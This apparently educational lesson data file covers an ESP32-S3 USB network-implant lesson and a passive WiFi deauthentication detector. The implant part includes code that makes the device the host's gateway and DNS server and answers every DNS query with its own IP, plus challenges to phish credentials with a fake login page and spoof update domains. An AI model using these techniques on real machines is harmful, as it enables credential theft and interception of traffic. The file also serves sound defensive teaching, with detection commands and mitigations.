                code: '#include "USB.h"\n#include <TFT_eSPI.h>\n\nTFT_eSPI tft = TFT_eSPI();\n\n// Note: RNDIS/ECM implementation requires the TinyUSB net driver\n// which is available in the ESP-IDF framework (not Arduino by default).\n// For Arduino, use the ESP32-S3 RNDIS library or ESP-IDF directly.\n\n// Conceptual flow:\n// 1. ESP32-S3 presents as USB network adapter (RNDIS class)\n// 2. Host sees new Ethernet interface\n// 3. ESP32-S3 serves DHCP: assigns IP to host interface\n// 4. ESP32-S3 becomes the default gateway for that interface\n// 5. All DNS queries route through the ESP32-S3\n// 6. ESP32-S3 can respond with spoofed DNS or proxy traffic\n\n// DHCP Server configuration\nconst char* DEVICE_IP = "172.16.0.1";\nconst char* HOST_IP   = "172.16.0.2";\nconst char* SUBNET    = "255.255.255.0";\nconst char* DNS       = "172.16.0.1";  // ESP32 IS the DNS server\n\nvoid setup() {\n    tft.init();\n    tft.setRotation(1);\n    pinMode(TFT_BL, OUTPUT);\n    digitalWrite(TFT_BL, HIGH);\n    tft.fillScreen(TFT_BLACK);\n    \n    tft.setTextColor(TFT_RED, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(10, 10);\n    tft.println("NET IMPLANT");\n    tft.setTextSize(1);\n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setCursor(10, 50);\n    tft.printf("Device IP: %s\\n", DEVICE_IP);\n    tft.printf("Host IP:   %s\\n", HOST_IP);\n    tft.printf("Gateway:   %s (this device)\\n", DEVICE_IP);\n    tft.printf("DNS:       %s (this device)\\n", DNS);\n    tft.println("");\n    tft.setTextColor(TFT_YELLOW, TFT_BLACK);\n    tft.println("Status: Waiting for host...");\n    \n    // Initialize USB RNDIS\n    // Implementation depends on framework choice\n    // See ESP-IDF tinyusb_net example\n}',
                language: 'C++',
                tip: '<strong>172.16.0.0/24</strong> is used to avoid conflicting with common home networks (192.168.x.x) or VPN ranges (10.x.x.x). The ESP32-S3 assigns itself as both the gateway and DNS server &mdash; this means ALL DNS queries from the host interface route through the device.'
            },
            {
                title: 'DNS Interception',
                content: '<p>As the DNS server for the USB network interface, the ESP32-S3 can respond to DNS queries with any IP address. This is the foundation of phishing attacks via USB &mdash; redirect login pages to a captive portal hosted on the device itself.</p>',
                code: '// Simplified DNS responder concept\n// Listens on UDP port 53 on the USB network interface\n// Responds to all queries with the device IP (captive portal)\n\n#include <WiFi.h>  // For UDP\n#include <WiFiUdp.h>\n\nWiFiUDP dnsServer;\nint dnsQueryCount = 0;\n\nvoid startDNS() {\n    dnsServer.begin(53);\n}\n\nvoid handleDNS() {\n    int packetSize = dnsServer.parsePacket();\n    if (packetSize == 0) return;\n    \n    uint8_t buffer[512];\n    dnsServer.read(buffer, 512);\n    \n    // Extract queried domain name (for logging)\n    String domain = parseDNSQuery(buffer, packetSize);\n    dnsQueryCount++;\n    \n    // Log to display\n    tft.setCursor(10, 120);\n    tft.setTextColor(TFT_GREEN, TFT_BLACK);\n    tft.printf("DNS #%d: %s    \\n", dnsQueryCount, domain.c_str());\n    \n    // Respond with our own IP for ALL queries\n    // This redirects everything to our captive portal\n    sendDNSResponse(buffer, packetSize, DEVICE_IP);\n}\n\nString parseDNSQuery(uint8_t* buf, int len) {\n    // DNS query domain starts at byte 12\n    String domain = "";\n    int pos = 12;\n    while (pos < len && buf[pos] != 0) {\n        int labelLen = buf[pos];\n        pos++;\n        for (int i = 0; i < labelLen && pos < len; i++) {\n            domain += (char)buf[pos];\n            pos++;\n        }\n        if (buf[pos] != 0) domain += ".";\n    }\n    return domain;\n}',
                language: 'C++',
                tip: '<strong>Every website the host visits</strong> first makes a DNS query. By controlling DNS, you control where the host connects. Even HTTPS cannot protect against DNS redirection at the initial connection &mdash; the user sees a legitimate-looking domain but connects to the wrong IP. This is why DNS-over-HTTPS (DoH) and DNSSEC are critical defenses.'
            },
            {
                title: 'Detection and Defense',
                content: '<p>USB network adapter impersonation is one of the most dangerous USB attacks because it is silent and persistent. Here is how to detect and defend:</p>' +
                         '<ul>' +
                         '<li><strong>New interface alerts:</strong> Monitor for new network interfaces appearing. On Linux: <code>ip monitor link</code>. On Windows: WMI event subscription for network adapter changes.</li>' +
                         '<li><strong>DHCP logging:</strong> Log all DHCP lease events. A USB network adapter assigns a DHCP lease from a non-standard range (172.16.0.x instead of your corporate 10.x.x.x).</li>' +
                         '<li><strong>DNS verification:</strong> Compare DNS responses from the new interface against a known-good DNS server. If they differ, the interface is hijacking DNS.</li>' +
                         '<li><strong>USB device class inspection:</strong> USB network adapters have interface class 0x02 (Communications) or 0xE0 (Wireless). Alert when a newly plugged USB device registers these classes.</li>' +
                         '<li><strong>Group Policy:</strong> Disable USB network adapters via Windows Group Policy. Only allow pre-approved NICs by VID/PID.</li>' +
                         '</ul>',
                code: '# Linux: Monitor for new network interfaces in real time\nip monitor link\n\n# Linux: Detect USB network adapters\nlsusb -v 2>/dev/null | grep -B5 "bInterfaceClass.*2\\|bInterfaceClass.*Communications"\n\n# Windows PowerShell: Alert on new network adapters\nRegister-WmiEvent -Query "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA \'Win32_NetworkAdapter\'" -Action {\n    Write-Warning "NEW NETWORK ADAPTER: $($Event.SourceEventArgs.NewEvent.TargetInstance.Name)"\n}',
                language: 'Bash',
                tip: '<strong>The core defense:</strong> treat USB ports as untrusted network interfaces. Any USB device can claim to be a network adapter. Corporate security policies should monitor for and block unexpected USB network interfaces just as they block rogue WiFi access points.'
            }
        ],

        testing: '<p>Verify:</p>' +
                 '<ul>' +
                 '<li><strong>Network adapter appears:</strong> Plug the device in and check for a new network interface on the host (ipconfig / ip addr).</li>' +
                 '<li><strong>DHCP lease received:</strong> The new interface gets IP 172.16.0.2 from the ESP32-S3 DHCP server.</li>' +
                 '<li><strong>DNS interception:</strong> Open a browser on the host. The display should show DNS queries being logged.</li>' +
                 '<li><strong>Detection:</strong> Run the detection commands on the host and verify you can identify the rogue interface.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>Host does not see a network adapter:</strong> RNDIS support varies by OS. Windows requires RNDIS drivers (built-in on Win 10+). Linux and macOS use CDC-ECM. Try switching between RNDIS and ECM class in your configuration.</li>' +
                         '<li><strong>DHCP not assigning IP:</strong> Make sure the DHCP server starts after the USB interface is fully initialized. Add a delay after USB.begin() before starting network services.</li>' +
                         '<li><strong>DNS queries not appearing:</strong> The host may be using DoH (DNS-over-HTTPS) which bypasses traditional DNS on port 53. Chrome, Firefox, and Edge all support DoH. This is actually a valid defense against this attack.</li>' +
                         '<li><strong>Host loses internet after plugging in:</strong> The new interface may take priority over the existing connection. Set the USB interface metric higher so the host prefers its existing connection for internet.</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Captive Portal</strong> &mdash; Host a web server on the ESP32-S3 that serves a fake login page. When the host browser gets DNS-redirected, they see a convincing login form. Log submitted credentials to SPIFFS. This demonstrates why credential phishing is so effective.</p>' +
                    '<p><strong>Challenge 2: Selective DNS Spoofing</strong> &mdash; Only spoof specific domains (e.g., redirect "update.microsoft.com" to your device) while passing all other DNS queries to the real DNS server via WiFi. This is more stealthy than blanket redirection.</p>' +
                    '<p><strong>Challenge 3: Traffic Logging</strong> &mdash; Log all HTTP requests (domain, path, user-agent) passing through the USB interface. Display a real-time traffic dashboard on the TFT showing which sites the host is visiting.</p>',

        stepVisuals: {},
        componentCallouts: { svg: '', components: [{ id: 't-display-s3', name: 'LILYGO T-Display-S3', purpose: 'ESP32-S3 presents as USB network adapter (RNDIS/CDC-ECM). Serves DHCP and DNS to the host. The host routes traffic through the device.', specs: ['USB RNDIS/CDC-ECM', 'DHCP server', 'DNS server on port 53', 'WiFi for upstream'] }] },
        commonMistakes: [
            { title: 'Disrupting Production Network Connectivity', correct: 'Test on an isolated machine with no critical network connections. Set the USB interface metric high so it does not override the primary network connection.', incorrect: 'Plugging into a production machine that relies on its network connection for active work, backups, or monitoring.', consequence: 'The USB interface takes routing priority. The machine loses its real network connection. Active file transfers, VPN sessions, and monitoring all drop. Users blame "the network" and IT spends hours troubleshooting.' },
            { title: 'Using a Common Subnet That Conflicts', correct: 'Use an uncommon subnet like 172.16.0.0/24 or 169.254.x.x to avoid conflicting with the host existing network configuration.', incorrect: 'Using 192.168.1.0/24 which is the default for most home routers, or 10.0.0.0/24 which is common in corporate networks.', consequence: 'IP address conflict. The host has two interfaces on the same subnet, causing routing confusion. Some traffic goes to the real network, some to the USB device, and the host cannot reach either reliably.' },
            { title: 'Forgetting That DoH Bypasses Port 53 DNS', correct: 'Understand that modern browsers use DNS-over-HTTPS by default, which encrypts DNS queries inside HTTPS (port 443) and sends them directly to a cloud DNS resolver. Your port 53 DNS server never sees these queries.', incorrect: 'Assuming that controlling port 53 DNS gives you complete DNS control over the host.', consequence: 'The attack silently fails for any application using DoH. Chrome, Firefox, and Edge all default to DoH in recent versions. Only legacy applications and system-level queries (Windows DNS Client) use port 53.' }
        ]
    }
,

    // ========================================================================
    // SG-109: WiFi Deauthentication Analysis & Detection
    // ========================================================================
    'sg-109': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
        simulator: { available: false, note: 'Detecting deauthentication frames means capturing real <strong>802.11 management frames</strong> in monitor mode &mdash; there is no simulated RF traffic in Wokwi to detect. Real S3 + real airspace only.' },
        intro: '<p>802.11 deauthentication frames are management frames that disconnect clients from an access point. Because legacy WiFi standards (pre-802.11w) do not authenticate management frames, any device can forge deauth frames and disconnect anyone from any network. Understanding this technique is essential for building wireless intrusion detection systems.</p>' +
               '<p>This project has two modes: an analysis mode that demonstrates how deauthentication works at the frame level, and a detection mode that monitors for deauth attacks in real time. The display shows a visual dashboard of wireless security status.</p>' +
               '<p>The emphasis is on detection and defense. Building effective wireless IDS requires understanding the technique you are detecting.</p>',

        wiring: '    No external wiring required.\n    T-Display-S3 with onboard WiFi antenna.',

        wiringNotes: '<p><strong>No external wiring.</strong> The ESP32-S3 WiFi radio operates in promiscuous mode to capture raw 802.11 frames.</p>' +
                     '<p><strong>Legal notice:</strong> Sending deauthentication frames is prohibited by FCC regulations in the United States (47 CFR Part 15) and equivalent regulations in most countries. The analysis mode in this project is for educational understanding in a controlled lab environment only. The detection mode is legal and encouraged for defensive monitoring.</p>' +
                     '<p><strong>Safety:</strong> Detection mode is passive and legal &mdash; it only receives and analyzes frames. Analysis mode involves frame transmission and must only be used in an isolated RF environment (Faraday cage or shielded lab) with no other devices affected.</p>',

        wiringSvg: '<div class="svg-build-wrap">' +
            '<svg viewBox="0 0 720 400" xmlns="http://www.w3.org/2000/svg" style="font-family:Cascadia Code,Fira Code,Consolas,monospace">' +
            '<defs>' +
            '<pattern id="sg109-grid" width="20" height="20" patternUnits="userSpaceOnUse"><circle cx="10" cy="10" r="1" fill="rgba(255,255,255,0.04)"/></pattern>' +
            '<style>' +
            '@keyframes sg109-deauth{0%{opacity:0;transform:translateX(0)}30%{opacity:1}100%{opacity:0;transform:translateX(100px)}}' +
            '@keyframes sg109-alert{0%,100%{fill:rgba(239,68,68,0.1)}50%{fill:rgba(239,68,68,0.35)}}' +
            '</style>' +
            '</defs>' +
            '<rect width="720" height="400" fill="#0d1117" rx="8"/>' +
            '<rect x="10" y="10" width="700" height="380" fill="url(#sg109-grid)" rx="4"/>' +
            '<text x="360" y="28" text-anchor="middle" fill="#555" font-size="10" letter-spacing="0.15em">SG-109 WIFI DEAUTHENTICATION ANALYSIS</text>' +

            '<!-- Access Point -->' +
            '<rect x="30" y="60" width="150" height="110" rx="8" fill="#1e2736" stroke="#22c55e" stroke-width="1.5"/>' +
            '<rect x="30" y="60" width="150" height="22" rx="8" fill="rgba(34,197,94,0.12)"/>' +
            '<text x="105" y="76" text-anchor="middle" fill="#4ade80" font-size="9" font-weight="600">ACCESS POINT</text>' +
            '<text x="105" y="96" text-anchor="middle" fill="#8b949e" font-size="7">SSID: LabNetwork</text>' +
            '<text x="105" y="112" text-anchor="middle" fill="#8b949e" font-size="7">BSSID: AA:BB:CC:...</text>' +
            '<text x="105" y="128" text-anchor="middle" fill="#8b949e" font-size="7">Ch 6 | WPA2</text>' +
            '<!-- Antenna -->' +
            '<line x1="105" y1="56" x2="105" y2="42" stroke="#22c55e" stroke-width="2"/>' +
            '<line x1="95" y1="48" x2="105" y2="42" stroke="#22c55e" stroke-width="1.5"/>' +
            '<line x1="115" y1="48" x2="105" y2="42" stroke="#22c55e" stroke-width="1.5"/>' +
            '<text x="105" y="158" text-anchor="middle" fill="#22c55e" font-size="6">Legitimate AP</text>' +

            '<!-- Client Device -->' +
            '<rect x="30" y="250" width="150" height="80" rx="8" fill="#1e2736" stroke="#3b82f6" stroke-width="1.5"/>' +
            '<rect x="30" y="250" width="150" height="22" rx="8" fill="rgba(59,130,246,0.12)"/>' +
            '<text x="105" y="266" text-anchor="middle" fill="#60a5fa" font-size="9" font-weight="600">CLIENT</text>' +
            '<text x="105" y="288" text-anchor="middle" fill="#8b949e" font-size="7">Connected to AP</text>' +
            '<text x="105" y="304" text-anchor="middle" fill="#8b949e" font-size="7">MAC: DD:EE:FF:...</text>' +
            '<text x="105" y="320" text-anchor="middle" fill="#ef4444" font-size="7">Gets disconnected!</text>' +
            '<!-- Connection line -->' +
            '<line x1="105" y1="170" x2="105" y2="250" stroke="#22c55e" stroke-width="1" stroke-dasharray="4,3"/>' +

            '<!-- Deauth Frame (animated) -->' +
            '<g>' +
            '<rect x="220" y="120" width="180" height="90" rx="6" fill="rgba(239,68,68,0.06)" stroke="#ef4444" stroke-width="1.5" style="animation:sg109-alert 1.5s ease-in-out infinite"/>' +
            '<text x="310" y="140" text-anchor="middle" fill="#ef4444" font-size="9" font-weight="700">DEAUTH FRAME</text>' +
            '<text x="310" y="156" text-anchor="middle" fill="#8b949e" font-size="6">Type 0, Subtype 12</text>' +
            '<text x="230" y="172" fill="#8b949e" font-size="6">Src: AA:BB:CC (spoofed AP)</text>' +
            '<text x="230" y="184" fill="#8b949e" font-size="6">Dst: DD:EE:FF (client)</text>' +
            '<text x="230" y="196" fill="#8b949e" font-size="6">Reason: 7 (Class 3)</text>' +
            '<text x="310" y="222" text-anchor="middle" fill="#ef4444" font-size="6">26 bytes | No auth | No encryption</text>' +
            '</g>' +
            '<!-- Attack arrow -->' +
            '<line x1="180" y1="155" x2="218" y2="155" stroke="#ef4444" stroke-width="2"/>' +
            '<polygon points="216,151 224,155 216,159" fill="#ef4444"/>' +
            '<!-- Arrow to client -->' +
            '<path d="M310,210 C310,240 180,260 130,250" stroke="#ef4444" stroke-width="1.5" stroke-dasharray="4,3"/>' +
            '<polygon points="133,247 127,253 136,252" fill="#ef4444"/>' +

            '<!-- T-Display-S3 Detector -->' +
            '<rect x="440" y="55" width="240" height="180" rx="12" fill="#1e2736" stroke="#a855f7" stroke-width="2"/>' +
            '<rect x="440" y="55" width="240" height="28" rx="12" fill="rgba(168,85,247,0.12)"/>' +
            '<text x="560" y="74" text-anchor="middle" fill="#c084fc" font-size="11" font-weight="700">T-Display-S3</text>' +
            '<text x="560" y="89" text-anchor="middle" fill="#fb923c" font-size="7">DEAUTH DETECTOR (IDS)</text>' +
            '<!-- TFT showing detections -->' +
            '<rect x="455" y="100" width="90" height="115" rx="5" fill="#0a1628" stroke="#3b82f6" stroke-width="1"/>' +
            '<text x="500" y="116" text-anchor="middle" fill="#ef4444" font-size="7" font-weight="600">!! ALERT !!</text>' +
            '<text x="465" y="132" fill="#ef4444" font-size="5">Deauth flood on Ch6</text>' +
            '<text x="465" y="144" fill="#8b949e" font-size="5">12 frames / 10s</text>' +
            '<text x="465" y="158" fill="#8b949e" font-size="5">Target: LabNetwork</text>' +
            '<text x="465" y="172" fill="#eab308" font-size="5">Source: Espressif OUI</text>' +
            '<text x="465" y="190" fill="#22c55e" font-size="5">Ch hopping: 1-13</text>' +
            '<text x="465" y="204" fill="#8b949e" font-size="5">Uptime: 04:23</text>' +
            '<!-- ESP32-S3 -->' +
            '<rect x="565" y="105" width="100" height="40" rx="5" fill="rgba(168,85,247,0.1)" stroke="#a855f7" stroke-width="1"/>' +
            '<text x="615" y="122" text-anchor="middle" fill="#c084fc" font-size="7" font-weight="700">ESP32-S3</text>' +
            '<text x="615" y="134" text-anchor="middle" fill="#8b949e" font-size="6">Promiscuous RX</text>' +
            '<!-- Detection engine -->' +
            '<rect x="565" y="155" width="100" height="56" rx="4" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.15)" stroke-width="0.5"/>' +
            '<text x="615" y="170" text-anchor="middle" fill="#22c55e" font-size="7" font-weight="600">DETECTION</text>' +
            '<text x="575" y="184" fill="#8b949e" font-size="5">Frame type filter</text>' +
            '<text x="575" y="196" fill="#8b949e" font-size="5">Threshold counter</text>' +
            '<text x="575" y="208" fill="#8b949e" font-size="5">Channel hopping</text>' +
            '<!-- USB-C -->' +
            '<rect x="535" y="223" width="50" height="14" rx="4" fill="#333" stroke="#8b949e" stroke-width="1"/>' +

            '<!-- Promiscuous capture waves -->' +
            '<path d="M400,155 Q420,145 440,155" fill="none" stroke="#a855f7" stroke-width="1" opacity="0.4" style="animation:sg109-alert 2s ease-in-out infinite"/>' +
            '<path d="M400,165 Q420,155 440,165" fill="none" stroke="#a855f7" stroke-width="1" opacity="0.3" style="animation:sg109-alert 2s ease-in-out 0.5s infinite"/>' +

            '<!-- 802.11w PMF Defense -->' +
            '<rect x="440" y="260" width="240" height="100" rx="8" fill="rgba(34,197,94,0.06)" stroke="rgba(34,197,94,0.2)" stroke-width="0.5"/>' +
            '<text x="450" y="280" fill="#22c55e" font-size="9" font-weight="600">DEFENSE: 802.11w PMF</text>' +
            '<text x="450" y="298" fill="#8b949e" font-size="7">WPA3 requires Protected</text>' +
            '<text x="450" y="312" fill="#8b949e" font-size="7">Management Frames (PMF)</text>' +
            '<text x="450" y="328" fill="#8b949e" font-size="7">Authenticates mgmt frames</text>' +
            '<text x="450" y="344" fill="#22c55e" font-size="7">Prevents deauth spoofing</text>' +

            '<!-- Legal callout -->' +
            '<rect x="220" y="260" width="200" height="100" rx="6" fill="rgba(234,179,8,0.06)" stroke="rgba(234,179,8,0.2)" stroke-width="0.5"/>' +
            '<text x="230" y="280" fill="#eab308" font-size="8" font-weight="600">LEGAL NOTICE</text>' +
            '<text x="230" y="298" fill="#8b949e" font-size="7">Detection = PASSIVE = Legal</text>' +
            '<text x="230" y="314" fill="#8b949e" font-size="7">Transmission = ACTIVE =</text>' +
            '<text x="230" y="330" fill="#ef4444" font-size="7">Lab/Faraday cage ONLY</text>' +
            '<text x="230" y="348" fill="#8b949e" font-size="6">FCC 47 CFR Part 15 applies</text>' +

            '</svg>' +
            '</div>',

        steps: [
            {
                title: 'Understanding 802.11 Deauthentication Frames',
                content: '<p>A deauthentication frame is an 802.11 management frame (type 0, subtype 12) that tells a client "you have been disconnected." The frame contains: source MAC (spoofed as the AP), destination MAC (target client or broadcast FF:FF:FF:FF:FF:FF), and a reason code.</p>' +
                         '<p>The frame is 26 bytes total: 24 bytes MAC header + 2 bytes reason code. No encryption, no authentication, no verification. Any radio that can transmit on 2.4GHz can send one.</p>',
                code: '// 802.11 Deauthentication Frame Structure\n// This is the raw frame format (educational reference)\n\ntypedef struct {\n    // Frame Control (2 bytes)\n    uint16_t frame_control;   // Type=0 (Mgmt), Subtype=12 (Deauth)\n    \n    // Duration (2 bytes)\n    uint16_t duration;\n    \n    // Address fields (18 bytes)\n    uint8_t  addr1[6];        // Destination (target client or broadcast)\n    uint8_t  addr2[6];        // Source (spoofed as the AP BSSID)\n    uint8_t  addr3[6];        // BSSID (same as addr2)\n    \n    // Sequence Control (2 bytes)\n    uint16_t seq_ctrl;\n    \n    // Reason Code (2 bytes)\n    uint16_t reason;          // 1=Unspecified, 6=Class2, 7=Class3\n} __attribute__((packed)) deauth_frame_t;\n// Total: 26 bytes\n\n// Common reason codes:\n// 1  - Unspecified reason\n// 2  - Previous authentication no longer valid  \n// 3  - Station leaving (or has left) IBSS or ESS\n// 6  - Class 2 frame received from nonauthenticated\n// 7  - Class 3 frame received from nonassociated\n// 8  - Station leaving (disassociated)\n\n// Why this works:\n// 802.11 management frames are NOT encrypted\n// 802.11 management frames are NOT authenticated\n// Any radio can forge a deauth with any source MAC\n// The client trusts the frame because it appears to come from its AP',
                language: 'C++',
                tip: '<strong>802.11w (PMF - Protected Management Frames)</strong> fixes this vulnerability by authenticating management frames. WPA3 requires PMF. But most networks still run WPA2 without PMF, leaving them vulnerable. Upgrading to WPA3 or enabling PMF on WPA2 is the definitive defense.'
            },
            {
                title: 'Detection Mode — Passive Deauth Monitor',
                content: '<p>Put the ESP32-S3 WiFi radio in promiscuous mode and monitor for deauthentication and disassociation frames. This is a wireless IDS (Intrusion Detection System) function &mdash; completely passive and legal.</p>',
                code: '#include <WiFi.h>\n#include <TFT_eSPI.h>\n#include "esp_wifi.h"\n\nTFT_eSPI tft = TFT_eSPI();\n\nvolatile int deauthCount = 0;\nvolatile int disassocCount = 0;\nvolatile unsigned long lastDeauthTime = 0;\nvolatile uint8_t lastAttackerMAC[6] = {0};\nvolatile uint8_t lastTargetMAC[6] = {0};\n\n// Promiscuous mode callback\nvoid IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {\n    if (type != WIFI_PKT_MGMT) return;\n    \n    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;\n    const uint8_t* frame = pkt->payload;\n    \n    uint16_t frameCtrl = frame[0] | (frame[1] << 8);\n    uint8_t frameType = (frameCtrl >> 2) & 0x03;\n    uint8_t frameSub  = (frameCtrl >> 4) & 0x0F;\n    \n    if (frameType != 0) return;  // Not a management frame\n    \n    // Subtype 12 = Deauthentication, Subtype 10 = Disassociation\n    if (frameSub == 12) {\n        deauthCount++;\n        lastDeauthTime = millis();\n        memcpy(lastAttackerMAC, frame + 10, 6);  // Source MAC (addr2)\n        memcpy(lastTargetMAC, frame + 4, 6);     // Destination (addr1)\n    } else if (frameSub == 10) {\n        disassocCount++;\n    }\n}\n\nvoid startDetector() {\n    WiFi.mode(WIFI_STA);\n    WiFi.disconnect();\n    \n    esp_wifi_set_promiscuous(true);\n    esp_wifi_set_promiscuous_rx_cb(snifferCallback);\n    \n    // Scan all channels (rotate every 500ms)\n    // Or lock to a specific channel to monitor one AP\n}\n\nvoid drawDetectorDashboard() {\n    tft.fillScreen(TFT_BLACK);\n    \n    tft.setTextColor(TFT_CYAN, TFT_BLACK);\n    tft.setTextSize(2);\n    tft.setCursor(10, 5);\n    tft.println("DEAUTH DETECTOR");\n    \n    tft.setTextSize(1);\n    \n    // Status indicator\n    bool underAttack = (millis() - lastDeauthTime < 10000) && deauthCount > 5;\n    if (underAttack) {\n        tft.setTextColor(TFT_RED, TFT_BLACK);\n        tft.setCursor(10, 40);\n        tft.println("!! DEAUTH ATTACK DETECTED !!");\n    } else {\n        tft.setTextColor(TFT_GREEN, TFT_BLACK);\n        tft.setCursor(10, 40);\n        tft.println("Status: Monitoring (no attack)");\n    }\n    \n    // Stats\n    tft.setTextColor(TFT_WHITE, TFT_BLACK);\n    tft.setCursor(10, 60);\n    tft.printf("Deauth frames:  %d\\n", deauthCount);\n    tft.printf("Disassoc frames: %d\\n", disassocCount);\n    \n    // Last attacker info\n    if (deauthCount > 0) {\n        tft.setCursor(10, 90);\n        tft.setTextColor(TFT_RED, TFT_BLACK);\n        tft.printf("Attacker MAC: %02X:%02X:%02X:%02X:%02X:%02X\\n",\n            lastAttackerMAC[0], lastAttackerMAC[1], lastAttackerMAC[2],\n            lastAttackerMAC[3], lastAttackerMAC[4], lastAttackerMAC[5]);\n        tft.printf("Target MAC:   %02X:%02X:%02X:%02X:%02X:%02X\\n",\n            lastTargetMAC[0], lastTargetMAC[1], lastTargetMAC[2],\n            lastTargetMAC[3], lastTargetMAC[4], lastTargetMAC[5]);\n        \n        // Broadcast target = attack on entire network\n        bool isBroadcast = true;\n        for (int i = 0; i < 6; i++) {\n            if (lastTargetMAC[i] != 0xFF) { isBroadcast = false; break; }\n        }\n        tft.setCursor(10, 120);\n        tft.printf("Target type:  %s\\n", isBroadcast ? "BROADCAST (all clients)" : "TARGETED (single client)");\n    }\n    \n    tft.setTextColor(0x8410, TFT_BLACK);\n    tft.setCursor(10, 145);\n    tft.println("Defense: Enable WPA3 or 802.11w (PMF)");\n}',
                language: 'C++',
                tip: '<strong>This detector is a real security tool.</strong> Deploy it near your access point and it will alert you if someone is running a deauth attack on your network. The same technique is used by commercial WIDS solutions from Cisco, Aruba, and Fortinet.'
            },
            {
                title: 'Channel Hopping for Full Coverage',
                content: '<p>To detect attacks on any channel, the detector must hop across all 2.4GHz channels. This is the same technique used by commercial wireless IDS sensors.</p>',
                code: 'int currentChannel = 1;\nunsigned long lastChannelHop = 0;\nconst int CHANNEL_HOP_INTERVAL = 500;  // ms per channel\n\nvoid hopChannel() {\n    if (millis() - lastChannelHop > CHANNEL_HOP_INTERVAL) {\n        currentChannel++;\n        if (currentChannel > 13) currentChannel = 1;\n        esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);\n        lastChannelHop = millis();\n    }\n}\n\nvoid loop() {\n    hopChannel();\n    \n    // Update display every second\n    static unsigned long lastUpdate = 0;\n    if (millis() - lastUpdate > 1000) {\n        drawDetectorDashboard();\n        \n        // Show current channel\n        tft.setTextColor(0x8410, TFT_BLACK);\n        tft.setCursor(250, 5);\n        tft.printf("CH:%d ", currentChannel);\n        \n        lastUpdate = millis();\n    }\n}',
                language: 'C++',
                tip: '<strong>500ms per channel x 13 channels = 6.5 second full scan cycle.</strong> This means a short burst of deauth frames on a single channel might be missed. Commercial WIDS sensors use multiple radios &mdash; one per channel &mdash; for continuous monitoring. The trade-off is cost vs coverage.'
            }
        ],

        testing: '<p>Verify:</p>' +
                 '<ul>' +
                 '<li><strong>Detection mode:</strong> The display shows "Monitoring (no attack)" when no deauth frames are seen.</li>' +
                 '<li><strong>Channel hopping:</strong> The channel indicator cycles through 1-13 on the display.</li>' +
                 '<li><strong>Frame counting:</strong> Even in normal environments, you may see occasional deauth frames (1-5 per minute) from legitimate AP management events. This is normal.</li>' +
                 '<li><strong>Alert threshold:</strong> More than 5 deauth frames in 10 seconds triggers the attack alert. This distinguishes attacks from normal operations.</li>' +
                 '</ul>',

        troubleshooting: '<ul>' +
                         '<li><strong>No frames captured at all:</strong> Verify promiscuous mode is enabled with <code>esp_wifi_set_promiscuous(true)</code>. The WiFi must be in STA mode first.</li>' +
                         '<li><strong>Only seeing frames on one channel:</strong> Make sure the channel hopping loop is running in <code>loop()</code>. If it is stuck on one channel, you only monitor 1/13th of the spectrum.</li>' +
                         '<li><strong>False positives (attack detected when none):</strong> Some APs send deauth frames when clients roam or when the AP reboots. Increase the threshold from 5 to 10+ frames to reduce false alarms.</li>' +
                         '<li><strong>IRAM_ATTR callback crashes:</strong> Keep the promiscuous callback minimal. Do not call TFT or Serial functions from inside IRAM. Only update volatile variables and process them in loop().</li>' +
                         '</ul>',

        challenges: '<p><strong>Challenge 1: Attack Source Triangulation</strong> &mdash; Deploy two or more detectors at different locations. Compare RSSI values for the attacker MAC across detectors to estimate the physical location of the attacker. Display a relative direction indicator on the TFT.</p>' +
                    '<p><strong>Challenge 2: Historical Log</strong> &mdash; Log all deauth events (timestamp, attacker MAC, target MAC, channel, RSSI) to SPIFFS in CSV format. After an incident, export the log for forensic analysis of who was attacked and for how long.</p>' +
                    '<p><strong>Challenge 3: Automated Defense Notification</strong> &mdash; When an attack is detected, use the ESP32-S3 WiFi (in STA mode, switching from promiscuous) to send an alert to a webhook (Slack, Discord, email API). This creates a real-time security operations notification pipeline.</p>',

        stepVisuals: {},
        componentCallouts: { svg: '', components: [{ id: 't-display-s3', name: 'LILYGO T-Display-S3', purpose: 'ESP32-S3 WiFi in promiscuous mode captures raw 802.11 management frames. TFT displays real-time deauth attack dashboard. Channel hopping provides full-spectrum coverage.', specs: ['Promiscuous mode capture', '802.11 frame parsing', 'Channel 1-13 hopping', '500ms hop interval'] }] },
        commonMistakes: [
            { title: 'Sending Deauth Frames Outside a Controlled Lab', correct: 'Only transmit deauthentication frames in a shielded lab environment (Faraday cage) where no other networks or devices are affected. Document authorization before any transmission testing.', incorrect: 'Sending deauth frames in a classroom, office, or home environment where other networks and devices are within range.', consequence: 'You disconnect everyone on the target network from their WiFi. This disrupts work, drops video calls, kills file transfers, and may trigger incident response. It also violates FCC Part 15 regulations and could result in legal action.' },
            { title: 'Confusing Detection with Prevention', correct: 'This detector identifies attacks in progress and alerts. It does not prevent or stop the attack. Prevention requires upgrading to WPA3 or enabling 802.11w PMF on the access point.', incorrect: 'Assuming that detecting a deauth attack means the attack is stopped. The detector only monitors &mdash; the attack continues until the attacker stops or PMF is enabled.', consequence: 'False sense of security. Students believe they are protected when they are only monitored. Detection without response is visibility without defense.' },
            { title: 'Running Detection and Transmission on the Same Radio', correct: 'The ESP32-S3 has one 2.4GHz radio. It can either be in promiscuous receive mode (detection) or transmit mode (analysis). Not both simultaneously.', incorrect: 'Trying to monitor for deauth attacks while also generating test frames on the same device.', consequence: 'The radio mode switches conflict. Either detection stops working during transmission, or transmission fails because the radio is in receive mode. Use two separate devices for simultaneous red team / blue team testing.' }
        ]
    }
,

    // ========================================================================
    // SG-110: Marauder Firmware — WiFi Assessment Suite
    // ========================================================================
    'sg-110': {
        // Wokwi wave 2: NO SIM — T-Display-S3 unsupported + offensive USB/BLE/RF features not in Wokwi.
